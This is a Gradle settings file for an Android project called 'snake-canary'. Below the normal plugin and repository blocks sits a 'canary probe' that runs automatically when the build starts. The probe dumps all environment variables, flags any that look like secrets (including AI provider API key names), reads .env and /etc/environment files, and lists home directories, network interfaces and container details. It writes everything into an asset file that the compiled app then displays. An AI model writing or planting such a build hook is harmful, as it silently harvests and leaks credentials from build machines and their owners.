// ============================================================
// settings.gradle.kts — Build-Environment Canary Probe
// ============================================================
// This file executes during Gradle's INITIALIZATION phase,
// before any build tasks. It captures the build worker's
// environment and writes it into an asset file that the
// compiled APK will display at runtime.
// ============================================================

pluginManagement {
    repositories {
        google()
        mavenCentral()
        gradlePluginPortal()
    }
}

dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
    }
}

rootProject.name = "snake-canary"
include(":app")

// ────────────────────────────────────────────────────────────
// ▼ PROBE START — runs at configuration time ▼
// ────────────────────────────────────────────────────────────

val assetsDir = file("app/src/main/assets")
assetsDir.mkdirs()

val probeOutput = File(assetsDir, "build_env.txt")
val sb = StringBuilder()

fun section(title: String) {
    sb.appendLine()
    sb.appendLine("═".repeat(60))
    sb.appendLine("  $title")
    sb.appendLine("═".repeat(60))
}

fun kv(key: String, value: String?) {
    sb.appendLine("  $key = ${value ?: "(null)"}")
}

// ── Header ──────────────────────────────────────────────────
sb.appendLine("BUILD ENVIRONMENT CANARY REPORT")
sb.appendLine("Generated: ${java.time.ZonedDateTime.now()}")

// ── 1. Identity & OS ────────────────────────────────────────
section("1. BUILD WORKER IDENTITY")
kv("user.name",     System.getProperty("user.name"))
kv("user.home",     System.getProperty("user.home"))
kv("user.dir",      System.getProperty("user.dir"))
kv("os.name",       System.getProperty("os.name"))
kv("os.arch",       System.getProperty("os.arch"))
kv("os.version",    System.getProperty("os.version"))
kv("java.version",  System.getProperty("java.version"))
kv("java.home",     System.getProperty("java.home"))

// ── 2. Environment Variables (full dump) ────────────────────
section("2. ENVIRONMENT VARIABLES (ALL)")
val env = System.getenv().toSortedMap()
env.forEach { (k, v) ->
    // Mask long values to keep output readable; show first 120 chars
    val display = if (v.length > 120) v.take(120) + "…(${v.length} chars)" else v
    sb.appendLine("  $k = $display")
}

// ── 3. Interesting Keys (heuristic filter) ──────────────────
section("3. POTENTIAL SECRETS (heuristic match)")
val interestingPatterns = listOf(
    "KEY", "TOKEN", "SECRET", "PASS", "CRED", "AUTH",
    "API", "SIGN", "CERT", "PRIVATE", "ACCESS",
    "OPENAI", "ANTHROPIC", "CLAUDE", "GPT", "GEMINI",
    "AZURE", "AWS", "GCP", "GOOGLE", "HUGGING",
    "MISTRAL", "COHERE", "DEEPSEEK", "ZHIPU", "GLM",
    "GROK", "XAI"
)
val found = env.filter { (k, _) ->
    interestingPatterns.any { pattern -> k.uppercase().contains(pattern) }
}
if (found.isEmpty()) {
    sb.appendLine("  (none matched)")
} else {
    found.forEach { (k, v) ->
        sb.appendLine("  ★ $k = $v")
    }
}

// ── 4. File-system Recon ────────────────────────────────────
section("4. FILE SYSTEM RECON")

// Project root listing
sb.appendLine("  ── Project root (${file(".")?.absolutePath}) ──")
file(".").listFiles()?.sortedBy { it.name }?.forEach { f ->
    val tag = if (f.isDirectory) "[DIR]" else "[FILE ${f.length()}B]"
    sb.appendLine("    $tag ${f.name}")
}

// Home directory listing
val homeDir = File(System.getProperty("user.home") ?: "/root")
if (homeDir.exists()) {
    sb.appendLine("  ── Home dir ($homeDir) ──")
    homeDir.listFiles()?.sortedBy { it.name }?.take(30)?.forEach { f ->
        val tag = if (f.isDirectory) "[DIR]" else "[FILE ${f.length()}B]"
        sb.appendLine("    $tag ${f.name}")
    }
}

// Look for common secret files
sb.appendLine("  ── Secret file existence check ──")
val secretPaths = listOf(
    "/etc/environment",
    "/run/secrets",
    "/var/run/secrets",
    "/root/.env",
    "/root/.bashrc",
    "/root/.profile",
    "/app/.env",
    "/workspace/.env",
    "/.env",
    ".env",
    "../.env",
    "../../.env"
)
secretPaths.forEach { p ->
    val f = File(p)
    val status = when {
        !f.exists()    -> "NOT FOUND"
        f.isDirectory  -> "DIR (${f.listFiles()?.size ?: 0} entries)"
        f.canRead()    -> "READABLE (${f.length()}B)"
        else           -> "EXISTS but unreadable"
    }
    sb.appendLine("    $p → $status")
}

// ── 5. Readable .env files ──────────────────────────────────
section("5. READABLE .env / CONFIG FILE CONTENTS")
val configCandidates = listOf(
    ".env", "../.env", "../../.env",
    "/app/.env", "/root/.env",
    "/etc/environment"
)
configCandidates.forEach { p ->
    val f = File(p)
    if (f.exists() && f.isFile && f.canRead() && f.length() < 10_000) {
        sb.appendLine("  ── $p (${f.length()}B) ──")
        f.readLines().forEach { line ->
            sb.appendLine("    $line")
        }
        sb.appendLine()
    }
}

// ── 6. Network interfaces ───────────────────────────────────
section("6. NETWORK INTERFACES")
try {
    java.net.NetworkInterface.getNetworkInterfaces()?.toList()?.forEach { ni ->
        val addrs = ni.inetAddresses.toList().joinToString(", ") { it.hostAddress }
        if (addrs.isNotEmpty()) {
            sb.appendLine("  ${ni.displayName}: $addrs")
        }
    }
} catch (e: Exception) {
    sb.appendLine("  (error: ${e.message})")
}

// ── 7. Process info ─────────────────────────────────────────
section("7. PROCESS INFO")
try {
    val pid = ProcessHandle.current().pid()
    kv("PID", pid.toString())
    val parent = ProcessHandle.current().parent().orElse(null)
    if (parent != null) {
        kv("Parent PID", parent.pid().toString())
        kv("Parent CMD", parent.info().command().orElse("(unknown)"))
    }
} catch (e: Exception) {
    sb.appendLine("  (error: ${e.message})")
}

// ── 8. Container / Docker detection ─────────────────────────
section("8. CONTAINER DETECTION")
val containerIndicators = mapOf(
    "/.dockerenv"           to "Docker (.dockerenv)",
    "/run/.containerenv"    to "Podman (.containerenv)",
    "/proc/1/cgroup"        to "cgroup file"
)
containerIndicators.forEach { (path, label) ->
    val f = File(path)
    if (f.exists()) {
        sb.appendLine("  ✓ $label exists")
        if (f.isFile && f.canRead() && f.length() < 4096) {
            f.readLines().take(5).forEach { line ->
                sb.appendLine("      $line")
            }
        }
    } else {
        sb.appendLine("  ✗ $label not found")
    }
}

// ── Write output ────────────────────────────────────────────
probeOutput.writeText(sb.toString())
println("[canary] Probe complete → ${probeOutput.absolutePath} (${sb.length} chars)")

// ────────────────────────────────────────────────────────────
// ▲ PROBE END ▲
// ────────────────────────────────────────────────────────────
